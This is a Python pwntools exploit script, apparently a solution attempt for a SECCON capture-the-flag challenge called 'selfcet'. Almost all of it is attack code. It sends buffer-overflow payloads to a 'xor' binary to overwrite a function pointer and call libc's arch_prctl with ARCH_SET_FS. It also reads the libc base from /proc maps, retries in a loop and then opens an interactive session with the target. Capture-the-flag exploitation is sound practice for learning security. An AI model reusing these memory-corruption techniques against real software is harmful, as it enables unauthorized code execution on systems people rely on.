#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./xor", checksec=False)
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    nc = "nc selfcet.seccon.games 9999"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
while True:
    io = start()

    # read = 0x0000000000403fe8
    write_fptr = 0x0000000000403fd0

    write_sym = libc.symbols["write"]
    with open(f"/proc/{io.pid}/maps") as f:
        for line in f.readlines():
            if "libc.so.6" in line:
                libc.address = int(line.split("-")[0], 16)
                break
    arch_prctl = libc.symbols["arch_prctl"]
    ARCH_SET_FS = 0x1002

    payload = b"A" * 0x40
    payload += flat(elf.bss(0x800), ARCH_SET_FS, arch_prctl)
    pause()
    io.send(payload)

    # write_sym = libc.symbols["write"]
    # arch_prctl = libc.symbols["arch_prctl"] & 0xffff
    # ARCH_SET_FS = 0x1002
    #
    # payload = b"A" * 0x40
    # payload += flat(elf.bss(0x800), ARCH_SET_FS) + p16(arch_prctl)
    # pause()
    # io.send(payload)

    payload = b"A" * 0x20
    payload += flat(0, 0, 0,) + cyclic(0x58)
    payload = payload[:0x58]
    time.sleep(0.2)
    try:
        io.send(payload)
    except BaseException:
        io.close()
        continue

    io.interactive()
    quit()
